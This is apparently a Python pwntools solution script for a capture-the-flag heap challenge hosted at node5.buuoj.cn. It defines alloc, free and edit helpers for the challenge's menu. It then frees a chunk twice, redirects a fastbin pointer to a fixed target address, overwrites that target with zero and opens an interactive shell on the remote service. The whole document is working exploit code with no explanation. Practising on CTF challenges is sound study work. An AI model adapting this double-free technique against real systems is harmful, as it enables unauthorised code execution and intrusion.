from pwn import *

sh=remote("node5.buuoj.cn",29068)

def alloc(size):
	sh.sendlineafter(b'choice>',str(1))
	sh.sendlineafter(b'size>',str(size))
	
def free(index):
	sh.sendlineafter(b'choice>',str(2))
	sh.sendlineafter(b'index>',str(index))
    	
def edit(index,content):
	sh.sendlineafter(b'choice>',str(3))
	sh.sendlineafter(b'index>',str(index))
	sh.send(content)
	
def shell():
	sh.sendlineafter(b'choice>',str(4))
	
target=0x0000000000602090
alloc(0x40) #0
alloc(0x40) #1
free(0)
free(1)
free(0)

edit(0,p64(target-0x10))
alloc(0x40)
alloc(0x40)

edit(3,p64(0))
shell()

sh.interactive()

